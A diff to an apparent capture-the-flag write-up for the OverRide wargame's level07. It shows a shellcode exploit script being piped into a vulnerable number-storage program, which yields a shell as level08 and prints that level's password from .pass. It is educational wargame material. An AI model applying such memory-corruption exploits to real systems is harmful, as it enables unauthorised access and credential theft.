@@ -211,4 +211,28 @@ Input command:  Number:  Index:  Completed store command successfully
 Great! Now we just need to put the shellcode on the code and the return address
 to the beginning of the shellcode.
 
+This is written on the script, with a little of trial and error we can make
+our address hit the shellcode
 
+```bash
+level07@OverRide:~$ (python /tmp/level07/script.py; cat -) | env -i ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+[...]
+
+Input command:  Number:  Index:  Completed store command successfully
+whoami
+level08
+cd ../level08
+cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
